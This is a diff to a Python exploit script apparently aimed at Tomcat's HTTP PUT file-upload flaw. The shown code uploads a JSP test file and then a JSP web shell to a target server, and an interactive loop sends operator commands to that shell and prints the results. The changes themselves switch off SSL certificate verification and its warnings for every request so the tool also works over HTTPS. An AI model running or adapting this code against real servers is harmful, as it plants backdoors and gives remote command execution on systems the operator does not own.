@@ -4,6 +4,10 @@ import re
 import signal
 import argparse
 import sys
+import urllib3
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class bcolors:
     HEADER = '\033[95m'
@@ -43,13 +47,13 @@ def removetags(tags):
 
 def getContent(url, f):
     headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
-    re = requests.get(str(url) + "/" + str(f), headers=headers)
+    re = requests.get(str(url) + "/" + str(f), headers=headers, verify=False)
     return re.content.decode('utf-8', errors='ignore')
 
 def createPayload(url, f):
     evil = '<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
     headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
-    req = requests.put(str(url) + str(f) + "/", data=evil, headers=headers)
+    req = requests.put(str(url) + str(f) + "/", data=evil, headers=headers, verify=False)
     if req.status_code == 201:
         print("File Created ..")
 
@@ -75,7 +79,7 @@ def RCE(url, f):
 <pre><%=output %></pre>"""
 
     headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
-    req = requests.put(str(url) + f + "/", data=EVIL, headers=headers)
+    req = requests.put(str(url) + f + "/", data=EVIL, headers=headers, verify=False)
 
 def shell(url, f):
     while True:
@@ -84,7 +88,7 @@ def shell(url, f):
         if cmd in ("q", "Q"):
             break
         payload = {'cmd': cmd}
-        re = requests.get(str(url) + "/" + str(f), params=payload, headers=headers)
+        re = requests.get(str(url) + "/" + str(f), params=payload, headers=headers, verify=False)
         content = re.content.decode('utf-8', errors='ignore')
         t = removetags(content)
         print(t)
